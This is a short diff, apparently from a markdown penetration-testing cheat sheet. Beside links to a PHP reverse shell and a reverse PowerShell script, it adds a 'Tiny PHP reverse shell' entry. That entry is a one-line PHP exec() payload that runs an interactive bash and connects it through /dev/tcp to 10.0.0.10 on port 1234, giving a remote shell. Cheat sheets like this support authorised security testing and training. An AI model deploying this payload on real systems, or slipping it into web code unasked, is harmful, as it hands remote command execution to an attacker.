@@ -301,6 +301,9 @@ Redirect this to message service on vulnerable machine e.g:
 ### PHP Reverse Shell
 https://github.com/pentestmonkey/php-reverse-shell
 
+### Tiny PHP reverse shell
+``` <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");```
+
 ### Reverse powershell 
 https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 ```
